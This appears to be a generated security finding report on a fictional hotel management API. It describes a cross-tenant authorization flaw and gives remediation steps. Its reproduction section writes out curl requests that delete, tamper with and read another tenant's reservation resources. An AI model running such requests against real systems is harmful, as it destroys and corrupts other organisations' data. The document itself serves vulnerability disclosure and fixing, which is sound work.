## System

- System: StayPro Property API v4.1.0
- Domain: HOSPITALITY / HOTEL PMS
- Example ID: BOLA-0080
- Risk ID: RISK-41-080

## Findings

### 1. Pattern 4.1 — Confused Deputy: Cross-Tenant Hotel Resource DELETE (HAR Primary)

**HAR evidence**: JWT `X-Tenant-ID: ORG-F33C`. Request: `DELETE /api/v2/resources/RES-2080`. Response: HTTP 200 OK with `"tenantId": "ORG-7DC8"`, `"ownerId": "other-user-f33c7dc8"`, `"sensitiveData": "CONFIDENTIAL: cross-tenant data for ORG-7DC8"`.

**Pattern 4.1 (Confused Deputy / Brokerage Failures — Integrity)**: the API server acts as a privileged broker between the client and the database. The "confused deputy" failure occurs when the server uses its database privileges to perform an action on the client's behalf without verifying that the client is authorized for the target resource. `ORG-F33C` client requests a DELETE — the server (deputy) has the authority to delete any resource in the database, but it fails to check that `RES-2080` belongs to `ORG-F33C`. The server is "confused" into acting as the deputy for `ORG-F33C` while actually operating on `ORG-7DC8`'s resource. Section 3.0: "Application code does NOT use tenant_id in authorization checks" (RISK-41-080).

**Hospitality / Hotel PMS impact**: resources represent hotel room reservations, property configurations, or OTA channel booking records. Cross-tenant DELETE by a competing hotel destroys another hotel chain's reservation data — canceling guest bookings, destroying revenue records, or corrupting property management configurations. PATCH enables tampering with room rates or guest data. This constitutes sabotage of a competitor's hotel operations.

## Reproduction

**Step 1 — Baseline:**

```bash
curl -s "https://api.staypro-propert.example.com/api/v2/resources/RES-1080" \
  -H "Authorization: Bearer <TOKEN_TENANT_ORG-F33C>" \
  -H "X-Tenant-ID: ORG-F33C"
```

Expected: `tenantId: "ORG-F33C"` — own hotel resource.

**Step 2 — Confused deputy DELETE: destroy competitor's hotel resource (primary HAR attack):**

```bash
curl -s -X DELETE "https://api.staypro-propert.example.com/api/v2/resources/RES-2080" \
  -H "Authorization: Bearer <TOKEN_TENANT_ORG-F33C>" \
  -H "X-Tenant-ID: ORG-F33C"
```

Expected secure: HTTP 403 or 404.  
Expected vulnerable: HTTP 200 with `tenantId: "ORG-7DC8"` — competitor's hotel reservation data destroyed, server's authority misused.

**Step 3 — Confused deputy PATCH: corrupt hotel resource data:**

```bash
curl -s -X PATCH "https://api.staypro-propert.example.com/api/v2/resources/RES-2080" \
  -H "Authorization: Bearer <TOKEN_TENANT_ORG-F33C>" \
  -H "X-Tenant-ID: ORG-F33C" \
  -H "Content-Type: application/json" \
  -d '{"status": "cancelled", "sensitive_data": "rate_tampered_by_attacker"}'
```

Expected vulnerable: HTTP 200 — competitor's room rates or reservation status corrupted.

**Step 4 — Cross-tenant read:**

```bash
curl -s "https://api.staypro-propert.example.com/api/v2/resources/RES-2080" \
  -H "Authorization: Bearer <TOKEN_TENANT_ORG-F33C>" \
  -H "X-Tenant-ID: ORG-F33C"
```

## Evidence

- **HAR**: `DELETE /api/v2/resources/RES-2080` with `ORG-F33C` JWT → HTTP 200 → `tenantId: ORG-7DC8` with `sensitiveData`.
- **Section 4.0 (RISK-41-080)**: Pattern 4.1 — GET/PATCH/DELETE lack tenant/owner filter.
- **Section 3.0**: Application code does not use `tenant_id` in authorization checks.

## Remediation

- **Add `WHERE tenant_id = $jwt_tenant_id AND owner_id = $jwt_sub`** to GET/PATCH/DELETE handlers (RISK-41-080, unblock #DB-180).
- **Enforce deputy constraints**: the server must verify that client-requested resource IDs match the client's authorized scope before using its elevated database privileges.
- **Centralize authorization middleware**: all resource IDs must be validated against the requesting tenant before any broker operation.
- **Regression test**: Tenant A token deletes Tenant B `resource_id` — assert HTTP 403/404.
